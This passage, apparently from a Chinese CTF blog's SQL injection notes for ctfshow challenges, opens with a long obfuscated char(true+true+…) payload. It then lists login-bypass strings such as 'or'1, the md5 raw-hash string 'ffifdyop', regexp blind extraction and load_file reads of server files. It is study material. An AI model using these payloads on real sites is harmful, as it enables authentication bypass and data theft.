class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span>),<span class="type">char</span>(<span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span>),<span class="type">char</span>(<span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span>),<span class="type">char</span>(<span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span>),<span class="type">char</span>(<span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span>),<span class="type">char</span>(<span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span>))</span><br></pre></td></tr></table></figure>



<h3 id="group-concat合并列"><a href="#group-concat合并列" class="headerlink" title="group_concat合并列"></a>group_concat合并列</h3><p>group_up可以直接合并一整个列：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> concat(username) uname <span class="keyword">from</span> ctfshow_user;</span><br></pre></td></tr></table></figure>

<h3 id="base64编码解码"><a href="#base64编码解码" class="headerlink" title="base64编码解码"></a>base64编码解码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">to_base64()		# 将结果转换为base64的形式</span><br><span class="line">from_base64()	# 将base64编码解码</span><br></pre></td></tr></table></figure>



<h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 万能密码的由来</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">or</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">-- &gt;0</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">or</span> <span class="number">1</span>;</span><br><span class="line"><span class="comment">-- &gt;1</span></span><br><span class="line"></span><br><span class="line"># 根据这个原理去改装查询用户名和密码的语句</span><br><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;$_POST[&quot;username&quot;]&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;$_POST[&quot;password&quot;]&#x27;</span>;</span><br><span class="line"># 如果单纯的使用上面的语法构造，就变成了：</span><br><span class="line">POST: username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span></span><br><span class="line"># 而语句就变成了</span><br><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="keyword">or</span><span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>



<h3 id="md5万能密码"><a href="#md5万能密码" class="headerlink" title="md5万能密码"></a>md5万能密码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ffifdyop&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="comment"># 返回的是形如 &#x27;or&#x27;???的格式的字符串</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;129581926211651571912466741651878684928&#x27;</span>, <span class="literal">true</span>)</span><br><span class="line"><span class="comment"># 这个也是形如 ?&#x27;or&#x27;?</span></span><br></pre></td></tr></table></figure>

<h3 id="0账户密码"><a href="#0账户密码" class="headerlink" title="0账户密码"></a>0账户密码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="number">0</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p><code>mariadb</code> 和 <code>mysql</code> 通用，都能得到非数字开头的用户名和密码。</p>
<h3 id="regexp正则表达式"><a href="#regexp正则表达式" class="headerlink" title="regexp正则表达式"></a>regexp正则表达式</h3><p>mysql的regexp正则表达式解读如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [kali]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username regexp (<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> password          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------------+</span></span><br><span class="line"><span class="operator">|</span> admin    <span class="operator">|</span> asdasdfadfasfasdf <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.000</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [kali]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username regexp (<span class="string">&#x27;ad&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> password          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------------+</span></span><br><span class="line"><span class="operator">|</span> admin    <span class="operator">|</span> asdasdfadfasfasdf <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.000</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [kali]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username regexp (<span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> password          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------------+</span></span><br><span class="line"><span class="operator">|</span> admin    <span class="operator">|</span> asdasdfadfasfasdf <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.000</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [kali]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username regexp (<span class="string">&#x27;admina&#x27;</span>);</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.000</span> sec)</span><br></pre></td></tr></table></figure>

<p>根据观察可以看出，如果正则表达式是加在某个字段后面，是可以挨个匹配字段的某个值的。并且如果匹配错误可以直接不回显。、</p>
<p>同样的，可以和其他的函数进行合并：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> pass <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span>if(load_file(<span class="string">&#x27;/var/www/html/api/index.php&#x27;</span>)regexp(<span class="string">&#x27;ctfshow&#123;5&#x27;</span>),<span class="number">1</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>注意，此处的合并是没有单双引号的。</p>
<h3 id="load-file读取服务器本地文件内容"><a href="#load-file读取服务器本地文件内容" class="headerlink" title="load_file读取服务器本地文件内容"></a>load_file读取服务器本地文件内容</h3><p>这个没什么好说的，读取具有可读取权限的内容，如果没权限是完全读取不了的。下面是本地的测试：（web189）</p>
